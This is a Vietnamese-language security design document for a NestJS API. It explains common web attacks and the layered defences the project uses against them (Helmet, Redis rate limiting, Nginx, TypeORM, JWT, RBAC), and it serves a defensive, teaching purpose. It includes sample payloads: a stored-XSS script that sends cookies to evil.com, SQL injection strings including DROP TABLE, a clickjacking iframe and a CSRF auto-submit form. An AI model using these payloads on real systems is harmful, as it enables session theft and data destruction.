# SECURITY

Tài liệu mô tả toàn bộ các loại tấn công, cơ chế hoạt động, ví dụ thực tế, biện pháp phòng tránh, và trạng thái triển khai trong dự án.

---

## Mục lục

1. [Tổng quan kiến trúc bảo mật](#1-tổng-quan-kiến-trúc-bảo-mật)
2. [XSS — Cross-Site Scripting](#2-xss--cross-site-scripting)
3. [Brute Force / Credential Stuffing](#3-brute-force--credential-stuffing)
4. [DoS — Body Size Attack](#4-dos--body-size-attack)
5. [DDoS — Distributed Denial of Service](#5-ddos--distributed-denial-of-service)
6. [Slowloris](#6-slowloris)
7. [Clickjacking](#7-clickjacking)
8. [MIME Sniffing](#8-mime-sniffing)
9. [SSL Stripping / Man-in-the-Middle](#9-ssl-stripping--man-in-the-middle)
10. [Stack Trace Exposure](#10-stack-trace-exposure)
11. [SQL Injection / ORM Injection](#11-sql-injection--orm-injection)
12. [Unauthorized Access / IDOR](#12-unauthorized-access--idor)
13. [CSRF — Cross-Site Request Forgery](#13-csrf--cross-site-request-forgery)
14. [Bot Traffic / Scraping](#14-bot-traffic--scraping)
15. [HTTP Parameter Pollution](#15-http-parameter-pollution)
16. [Authentication — JWT](#16-authentication--jwt)
17. [Authorization — RBAC](#17-authorization--rbac)
18. [Checklist lên production](#18-checklist-lên-production)

---

## 1. Tổng quan kiến trúc bảo mật

Hệ thống bảo vệ theo nhiều lớp (Defense in Depth) — attacker phải vượt qua từng lớp từ ngoài vào trong:

```
Internet (Attacker)
    │
    ▼
┌─────────────────────────────────┐
│  Cloudflare                     │  ← Lớp 1: Network
│  - Absorb DDoS volumetric       │
│  - Bot detection & block        │
│  - SSL termination              │
└─────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────┐
│  Nginx                          │  ← Lớp 2: Reverse Proxy
│  - Force HTTPS / HSTS           │
│  - Chặn Slowloris               │
│  - Không expose Node.js port    │
└─────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────────────────────────┐
│  NestJS Application                                 │  ← Lớp 3: Application
│                                                     │
│  bodyParser           → DoS body lớn               │
│  Helmet               → XSS (CSP), Clickjacking    │
│  CORS                 → Cross-origin trái phép      │
│  TemporaryBanGuard    → Brute force IP              │
│  JWT Guard            → Authentication             │
│  RBAC Guard           → Authorization              │
│  XssSanitizePipe      → XSS input                 │
│  ValidationPipe       → Injection, bad input       │
│  GlobalExceptionFilter → Stack trace exposure      │
└─────────────────────────────────────────────────────┘
    │
    ▼
┌─────────────────────────────────┐
│  Database (PostgreSQL / MySQL)  │  ← Lớp 4: Data
│  - TypeORM parameterized query  │
│  - Không expose port ra ngoài   │
└─────────────────────────────────┘
```

**Nguyên tắc:** Không tin vào bất kỳ tầng nào là đủ. Mỗi lớp bảo vệ một loại tấn công khác nhau — nếu một lớp bị bypass thì lớp tiếp theo vẫn chặn được.

---

## 2. XSS — Cross-Site Scripting

### Cơ chế tấn công

Attacker chèn script độc hại vào dữ liệu. Khi dữ liệu đó được render ra browser của người dùng khác, script chạy và có thể đánh cắp cookie, session token, hoặc redirect người dùng sang trang giả mạo.

**Có 3 loại XSS:**

**Stored XSS** — nguy hiểm nhất, script được lưu vào DB:
```
Attacker POST /api/posts
Body: { "title": "<script>fetch('https://evil.com?c='+document.cookie)</script>" }

→ Script lưu vào DB
→ User khác GET /api/posts → browser render → script chạy → cookie bị gửi về evil.com
```

**Reflected XSS** — script nằm trong URL:
```
https://yoursite.com/search?q=<script>alert(document.cookie)</script>

→ Server render q vào HTML response
→ Script chạy ngay khi user click link
```

**DOM-based XSS** — script thao túng DOM phía client, không qua server.

### Biện pháp trong dự án

| Lớp | Công cụ | Trạng thái |
|---|---|---|
| Server-side input sanitize | `XssSanitizePipe` | ✅ Đã triển khai |
| Browser-side script block | Helmet CSP header | ✅ Đã triển khai |

**XssSanitizePipe hoạt động:**
```typescript
// Input từ attacker
{ "name": "<script>alert(1)</script>John", "password": "<Pass@123>" }

// Sau khi qua pipe
{ "name": "John", "password": "<Pass@123>" }
//              ↑ script bị strip          ↑ password giữ nguyên (nằm trong SKIP_FIELDS)
```

**Helmet CSP header trả về:**
```
Content-Security-Policy:
  default-src 'self';
  script-src 'self';          ← chỉ cho phép script từ cùng domain
  img-src 'self' data: https: http:;
```

### Ưu điểm
- 2 lớp độc lập: pipe xử lý server-side, CSP xử lý browser-side
- Nếu pipe bị bypass thì CSP vẫn chặn script chạy trên browser

### Nhược điểm / Lưu ý
- `XssSanitizePipe` strip toàn bộ HTML — nếu sau này cần rich text editor thì phải cấu hình lại `allowedTags` trong pipe
- CSP không bảo vệ được nếu attacker có thể inject script vào chính domain của mình (subdomain takeover)

---

## 3. Brute Force / Credential Stuffing

### Cơ chế tấn công

**Brute Force** — thử toàn bộ tổ hợp password có thể:
```
POST /api/auth/login { "email": "user@gmail.com", "password": "aaaaaa" }
POST /api/auth/login { "email": "user@gmail.com", "password": "aaaaab" }
POST /api/auth/login { "email": "user@gmail.com", "password": "aaaaac" }
... (hàng triệu lần)
```

**Credential Stuffing** — dùng danh sách email/password bị leak từ các vụ hack khác:
```
# Attacker có file leak từ vụ hack Facebook/LinkedIn
POST /api/auth/login { "email": "user@gmail.com", "password": "Password123!" }
POST /api/auth/login { "email": "user2@gmail.com", "password": "Qwerty@2020" }
... (thử từng cặp trong danh sách)
```

### Biện pháp trong dự án

| Lớp | Công cụ | Trạng thái |
|---|---|---|
| Rate limiting tập trung | Redis | ✅ Đã triển khai |
| Tạm ban IP vi phạm | `TemporaryBanGuard` | ✅ Đã triển khai |

**Tại sao dùng Redis thay vì in-memory:**
```
Instance 1: IP 1.2.3.4 đã gửi 95 request  ← gần đến limit
Instance 2: IP 1.2.3.4 counter = 0         ← in-memory reset khi load balancer đổi instance

→ Attacker bypass được nếu dùng in-memory
→ Redis tập trung: mọi instance đọc cùng counter → không bypass được dù scale bao nhiêu instance
```

### Ưu điểm
- Redis hoạt động đúng khi scale nhiều instance
- `TemporaryBanGuard` block ngay ở tầng Guard, không tốn tài nguyên xử lý tiếp

### Nhược điểm / Lưu ý
- Attacker dùng botnet (nhiều IP khác nhau) vẫn có thể thử được — Cloudflare Bot Management phát hiện pattern bot để bù lại
- Rate limit quá chặt có thể ảnh hưởng user thật đang dùng mạng công ty (nhiều người share 1 IP)

---

## 4. DoS — Body Size Attack

### Cơ chế tấn công

Gửi request body cực lớn để server đọc hết vào RAM:
```bash
# Attacker tạo file 500MB và gửi lên
curl -X POST https://yourapi.com/api/users \
  -H "Content-Type: application/json" \
  -d @500mb_file.json

# Server bắt đầu đọc toàn bộ body vào RAM
# RAM hết → crash toàn bộ instance
# Nếu có nhiều instance → gửi đồng thời → toàn bộ cluster down
```

### Biện pháp trong dự án

```typescript
// bodyParser reject ngay khi body vượt 10mb
// Request không bao giờ vào đến controller
app.use(bodyParser.json({ limit: '10mb' }));

// Response trả về ngay lập tức:
// HTTP 413 Payload Too Large
```

**Tại sao đặt trước tất cả middleware:**
```
bodyParser (đầu tiên) → reject 413 ngay, RAM không bị đụng đến ✅

Nếu đặt sau:
  NestJS đọc body vào RAM → hết RAM → crash → bodyParser check limit → vô nghĩa ❌
```

### Ưu điểm
- Reject ở tầng thấp nhất, không tốn CPU/RAM để xử lý

### Nhược điểm / Lưu ý
- Limit 10mb có thể cần điều chỉnh nếu có endpoint upload file
- Nên tách endpoint upload ra dùng limit riêng thay vì nâng limit toàn bộ API

---

## 5. DDoS — Distributed Denial of Service

### Cơ chế tấn công

Hàng nghìn máy (botnet) đồng thời gửi request để làm nghẽn băng thông hoặc server:

```
Botnet (10,000 máy)
├── IP 1.2.3.4    → 1,000 req/s ┐
├── IP 5.6.7.8    → 1,000 req/s ├─→ Server nhận 10,000,000 req/s → down
├── IP 9.10.11.12 → 1,000 req/s ┘
└── ...

Không thể block từng IP vì có quá nhiều IP khác nhau
```

**Volumetric DDoS** — làm nghẽn băng thông:
```
Server có băng thông 1Gbps
Botnet gửi 100Gbps traffic → server không nhận được request thật
```

### Biện pháp trong dự án

| Lớp | Công cụ | Trạng thái |
|---|---|---|
| Absorb DDoS volumetric | Cloudflare | ✅ Đã triển khai |
| Lọc traffic độc hại | Cloudflare | ✅ Đã triển khai |
| Rate limit application | Redis | ✅ Đã triển khai |

### Ưu điểm
- Cloudflare xử lý ở tầng network, server không bao giờ thấy traffic DDoS

### Nhược điểm / Lưu ý
- **Quan trọng:** Nếu server IP bị lộ, attacker có thể tấn công thẳng vào IP, bypass Cloudflare hoàn toàn
- Không được để DNS record trỏ thẳng vào server IP — chỉ trỏ vào Cloudflare

---

## 6. Slowloris

### Cơ chế tấn công

Mở nhiều connection và gửi header rất chậm để giữ connection mãi không đóng:

```
Attacker mở 1,000 connection đến server
Mỗi connection gửi từng byte header rất chậm, không bao giờ gửi xong

→ Server chờ mãi vì nghĩ client đang gửi dở
→ 1,000 worker bị chiếm hết
→ Request thật không có worker để xử lý → timeout
```

### Biện pháp trong dự án

Nginx chặn bằng cách set timeout cho connection chậm:
```nginx
client_header_timeout 10s;  # nếu sau 10s chưa gửi xong header → đóng connection
client_body_timeout   10s;
keepalive_timeout     65s;
```

**Tại sao Nginx chặn được mà Node.js không:**
```
Attacker → Nginx (chặn Slowloris ở đây) → Node.js (không bao giờ thấy)

Nếu không có Nginx:
Attacker → Node.js (không có timeout mặc định cho slow connection) → bị chiếm worker
```

### Ưu điểm
- Nginx xử lý ở tầng thấp, hoàn toàn transparent với application

### Nhược điểm / Lưu ý
- **Phải đảm bảo chỉ Nginx mới được gọi vào Node.js** — firewall block port Node.js từ bên ngoài
- Nếu Node.js port bị expose trực tiếp ra internet thì không có gì chặn Slowloris

---

## 7. Clickjacking

### Cơ chế tấn công

Attacker nhúng trang web vào iframe ẩn trên trang của họ, lừa người dùng click vào:

```html
<!-- Trang của attacker -->
<iframe src="https://yoursite.com/transfer-money" style="opacity: 0; position: absolute;"></iframe>
<button style="position: absolute; top: 100px;">Nhận quà miễn phí!</button>

<!-- User click "Nhận quà" → thực ra đang click vào nút "Chuyển tiền" trong iframe ẩn -->
```

### Biện pháp trong dự án

Helmet tự động set header:
```
X-Frame-Options: SAMEORIGIN
```

Browser sẽ từ chối render trang trong iframe nếu không cùng domain.

### Ưu điểm
- Một dòng config Helmet, không cần code thêm gì

---

## 8. MIME Sniffing

### Cơ chế tấn công

Browser tự đoán content type thay vì tin vào `Content-Type` header:

```
Server trả file ảnh với Content-Type: image/jpeg
Nhưng file thực ra chứa JavaScript

→ Một số browser cũ đoán ra là JavaScript và execute
→ Script độc hại chạy
```

### Biện pháp trong dự án

Helmet set header:
```
X-Content-Type-Options: nosniff
```

Browser sẽ tin tuyệt đối vào `Content-Type` header, không tự đoán.

---

## 9. SSL Stripping / Man-in-the-Middle

### Cơ chế tấn công

Attacker đứng giữa client và server, downgrade kết nối từ HTTPS xuống HTTP:

```
User muốn vào: https://yoursite.com
Attacker intercept:
  User ←─ HTTP ─→ Attacker ←─ HTTPS ─→ Server

→ Attacker đọc được toàn bộ traffic giữa user và attacker (đoạn HTTP)
→ Token, password, data đều bị lộ
```

### Biện pháp trong dự án

| Lớp | Công cụ | Trạng thái |
|---|---|---|
| SSL certificate | Nginx | ✅ Đã triển khai |
| Force HTTPS redirect | Nginx | ✅ Đã triển khai |
| HSTS header | Nginx + Cloudflare | ✅ Đã triển khai |

**HSTS hoạt động:**
```
Lần đầu user vào HTTPS → server trả header:
Strict-Transport-Security: max-age=31536000; includeSubDomains

→ Browser ghi nhớ trong 1 năm: domain này chỉ dùng HTTPS
→ Lần sau dù user gõ http:// browser tự đổi thành https:// trước khi gửi request
→ Attacker không có cơ hội intercept đoạn HTTP
```

### Nhược điểm / Lưu ý
- Lần đầu tiên user vào vẫn có thể bị tấn công nếu gõ http:// (HSTS chưa được set)
- Giải pháp: đăng ký vào **HSTS Preload List** — browser tự biết domain phải dùng HTTPS ngay cả lần đầu

---

## 10. Stack Trace Exposure

### Cơ chế tấn công

Server vô tình trả stack trace trong response lỗi:

```json
// Response lỗi mặc định của NestJS — nguy hiểm ❌
{
  "statusCode": 500,
  "message": "Cannot read property 'id' of undefined",
  "stack": "TypeError: Cannot read property 'id' of undefined\n    at UserService.findOne (/app/src/user/user.service.ts:42:18)\n    at UserController.getUser (/app/src/user/user.controller.ts:28:5)"
}

// Hacker biết được:
// - Framework: NestJS
// - Cấu trúc folder: src/user/
// - Tên file: user.service.ts, user.controller.ts
// - Số dòng lỗi: line 42
// → Dễ dàng tìm CVE của framework version tương ứng
```

### Biện pháp trong dự án

`GlobalExceptionFilter` chuẩn hoá response và ẩn stack trace:

```json
// Production → chỉ trả thông tin tối thiểu ✅
{
  "statusCode": 500,
  "errorCode": "UNHANDLED_EXCEPTION",
  "message": "Internal server error",
  "path": "/api/users/123",
  "timestamp": "2026-04-05T10:30:00.000Z"
}
```

```json
// Dev (NODE_ENV !== 'production') → trả thêm stack để debug
{
  "statusCode": 500,
  "errorCode": "UNHANDLED_EXCEPTION",
  "message": "Internal server error",
  "stack": "TypeError: ...",
  "detail": "Cannot read property 'id' of undefined"
}
```

**Phân loại lỗi qua `errorCode`:**
```
errorCode: null                → HttpException có chủ đích (404, 401, 400...)
                                  Frontend xử lý theo statusCode bình thường

errorCode: UNHANDLED_EXCEPTION → Lỗi bất ngờ (DB crash, null pointer...)
                                  Frontend hiện thông báo lỗi chung chung
                                  Backend cần điều tra ngay qua winston log
```

### Ưu điểm
- Stack trace vẫn được ghi vào winston log để debug nội bộ
- Dev không bị ảnh hưởng — vẫn thấy stack trace khi `NODE_ENV=development`

---

## 11. SQL Injection / ORM Injection

### Cơ chế tấn công

Chèn SQL vào input để thao túng câu query:

```
# Nếu server nối string thô vào query
query = "SELECT * FROM users WHERE email = '" + email + "'"

# Attacker gửi:
email = "' OR '1'='1"

# Query thành:
SELECT * FROM users WHERE email = '' OR '1'='1'
→ Trả về toàn bộ user trong DB
```

```
# Tấn công xoá data:
email = "'; DROP TABLE users; --"

# Query thành:
SELECT * FROM users WHERE email = ''; DROP TABLE users; --'
→ Xoá toàn bộ bảng users
```

### Biện pháp trong dự án

| Lớp | Công cụ | Trạng thái |
|---|---|---|
| Validate format input | `ValidationPipe` | ✅ Đã triển khai |
| Strip ký tự HTML nguy hiểm | `XssSanitizePipe` | ✅ Đã triển khai |
| Parameterized query | TypeORM (built-in) | ✅ Đã triển khai |

**TypeORM tự động escape:**
```typescript
// Code TypeORM
userRepository.findOne({ where: { email } })

// TypeORM generate câu query dạng parameterized:
SELECT * FROM users WHERE email = $1
-- $1 = giá trị email đã được escape hoàn toàn

// Dù attacker gửi "' OR '1'='1" thì TypeORM xử lý như string thông thường
// Không thể escape ra khỏi tham số để inject SQL
```

### Nhược điểm / Lưu ý
- Nếu dùng raw query (`query()` hoặc `createQueryBuilder` với string nối tay) thì mất bảo vệ này
- **Luôn dùng parameterized query, không bao giờ nối string thô vào câu query**

---

## 12. Unauthorized Access / IDOR

### Cơ chế tấn công

**IDOR (Insecure Direct Object Reference)** — thay đổi ID trong request để truy cập data của người khác:

```
# User A đang đăng nhập, truy cập profile của mình
GET /api/users/123/profile   → trả data của user 123 ✅

# User A thay đổi ID thành 456
GET /api/users/456/profile   → trả data của user 456 ❌ (không phải của mình)
```

```
# Tấn công nặng hơn
DELETE /api/orders/789       → xoá đơn hàng của người khác
PUT /api/users/456/password  → đổi password của người khác
```

### Biện pháp trong dự án

| Lớp | Công cụ | Trạng thái |
|---|---|---|
| Xác thực danh tính | JWT Guard | ✅ Đã triển khai |
| Kiểm tra ownership trong service | Logic nghiệp vụ | ✅ Cần đảm bảo mọi endpoint đều check |

**Pattern chuẩn chống IDOR:**
```typescript
async getProfile(targetId: string, requester: User) {
  // Chỉ cho phép xem profile của chính mình
  // Hoặc admin được xem tất cả
  if (targetId !== requester.id && requester.role !== Role.ADMIN) {
    throw new ForbiddenException('Access denied');
  }
  return this.userRepository.findOne({ where: { id: targetId } });
}
```

---

## 13. CSRF — Cross-Site Request Forgery

### Cơ chế tấn công

Lừa browser của user đã đăng nhập gửi request đến server mà không có sự đồng ý:

```
1. User đăng nhập yoursite.com → browser lưu session cookie
2. User vào trang evil.com
3. evil.com có hidden form tự submit:
   <form action="https://yoursite.com/api/transfer" method="POST">
     <input name="amount" value="1000000">
     <input name="to" value="attacker_account">
   </form>
4. Browser tự động gửi request kèm cookie → server nhận và xử lý chuyển tiền
```

### Tại sao dự án này không bị ảnh hưởng nhiều

Dự án dùng **JWT Bearer token** thay vì cookie-based session:

```
Cookie session → browser tự đính kèm vào mọi request → CSRF nguy hiểm

JWT Bearer     → phải đọc từ localStorage/memory và đính thủ công vào header
Authorization: Bearer eyJhbGciOiJIUzI1NiIs...
               → evil.com không thể đọc token từ localStorage của domain khác
               → evil.com không thể tự đính header này vào request
               → CSRF thực tế vô hiệu
```

### Lưu ý
- Nếu sau này chuyển sang cookie-based auth thì phải thêm CSRF token
- CORS whitelist domain ở production cũng giảm thiểu CSRF thêm một lớp

---

## 14. Bot Traffic / Scraping

### Cơ chế tấn công

**Scraping** — bot tự động crawl toàn bộ data:
```
Bot gửi 10,000 request/phút → lấy toàn bộ sản phẩm, user, giá cả
→ Competitor dùng data của mình
→ Tốn tài nguyên server
```

### Biện pháp trong dự án

| Lớp | Công cụ | Trạng thái |
|---|---|---|
| Bot fingerprinting & block | Cloudflare Bot Management | ✅ Đã triển khai |
| Rate limit | Redis | ✅ Đã triển khai |
| IP ban | `TemporaryBanGuard` | ✅ Đã triển khai |

**Cloudflare phát hiện bot qua:**
```
- TLS fingerprint: bot thường có fingerprint khác browser thật
- Behavior analysis: request quá đều, quá nhanh, không có mouse movement
- JavaScript challenge: bot không execute JS → fail challenge
- IP reputation: IP nằm trong danh sách botnet đã biết
```

---

## 15. HTTP Parameter Pollution

### Cơ chế tấn công

Gửi cùng tên query param nhiều lần để gây hành vi bất ngờ:
```
GET /api/users?role=user&role=admin
```

Express mặc định gộp thành array:
```typescript
req.query.role // ['user', 'admin']

// Code không expect array:
const role = req.query.role.toUpperCase() // crash: array không có toUpperCase()
```

### Tại sao dự án này không cần thêm gì

`ValidationPipe` với `transform: true` đã xử lý:
```typescript
// DTO khai báo
class SearchDto {
  @IsString()
  sort: string;  // expect string
}

// ValidationPipe nhận array ['asc', 'desc'] cho field kiểu string
// → tự động báo lỗi 400 Bad Request, không vào đến service
```

---

## 16. Authentication — JWT

### Vai trò trong security

JWT không chống tấn công mạng trực tiếp, nhưng là nền tảng để biết **ai đang gửi request**. Không có JWT thì các lớp bảo vệ khác chặn được attacker từ ngoài nhưng không phân biệt được user với nhau.

### Cơ chế JWT

```
1. User đăng nhập thành công
   Server tạo token: base64(header).base64(payload).signature
   Payload: { userId: 123, role: 'user', exp: 1717200000 }
   Signature: HMAC-SHA256(header + payload, SECRET_KEY)

2. User gửi request tiếp theo
   Authorization: Bearer eyJhbGci...

3. Server verify:
   - Decode token
   - Verify signature với SECRET_KEY → đảm bảo token không bị giả mạo
   - Check exp → đảm bảo token chưa hết hạn
   - Lấy userId, role từ payload → biết ai đang gọi và có quyền gì
```

### Điểm cần chú ý

```typescript
// SECRET_KEY phải đủ dài và ngẫu nhiên
// Nếu SECRET_KEY yếu → attacker brute force ra key → tự tạo token với bất kỳ userId nào

JWT_SECRET=your-secret-key           // ❌ quá ngắn, dễ đoán
JWT_SECRET=a8f3b2c1d9e4f7a0b5c2...   // ✅ ít nhất 32 ký tự random

// Access token nên có thời hạn ngắn
// Nếu token bị leak → chỉ có hiệu lực trong thời gian ngắn
JWT_EXPIRATION=15m    // access token 15 phút
REFRESH_EXPIRATION=7d // refresh token 7 ngày
```

---

## 17. Authorization — RBAC

### Vai trò trong security

RBAC (Role-Based Access Control) kiểm soát **user được làm gì** sau khi đã xác thực danh tính.

```
Authentication (JWT): "Bạn là ai?"      → userId: 123, role: 'user'
Authorization (RBAC): "Bạn được làm gì?" → user chỉ được đọc, không được xoá
```

### Ví dụ tấn công nếu không có RBAC

```
User thường gọi endpoint admin:
DELETE /api/admin/users/456

Nếu chỉ check JWT (đã đăng nhập) mà không check role
→ User thường xoá được account người khác
→ Hoặc truy cập được data nhạy cảm của toàn bộ hệ thống
```

### Pattern trong dự án

```typescript
// Khai báo role cần thiết cho endpoint
@Roles(Role.ADMIN)
@UseGuards(JwtAuthGuard, RolesGuard)
@Delete('/users/:id')
async deleteUser(@Param('id') id: string) { ... }

// RolesGuard kiểm tra:
// req.user.role (lấy từ JWT) có nằm trong @Roles() không?
// Không → 403 Forbidden
```

---

## 18. Checklist lên production

### Bắt buộc
- [ ] Đổi CORS từ `origin: '*'` sang whitelist domain cụ thể
- [ ] Tắt Swagger (`NODE_ENV === 'production'`)
- [ ] Set `NODE_ENV=production` để `GlobalExceptionFilter` ẩn stack trace
- [ ] `JWT_SECRET` ít nhất 32 ký tự random
- [ ] Node.js port không expose ra internet — chỉ Nginx mới gọi được vào
- [ ] DNS chỉ trỏ vào Cloudflare, không trỏ thẳng vào server IP

### Nên làm
- [ ] Đăng ký HSTS Preload để bảo vệ ngay cả lần đầu user vào
- [ ] Monitor winston log để phát hiện pattern tấn công sớm
- [ ] Định kỳ rotate `JWT_SECRET` và invalidate toàn bộ token cũ
- [ ] Review mọi endpoint đảm bảo đều check ownership (chống IDOR)
- [ ] Không bao giờ dùng raw query nối string trong TypeORM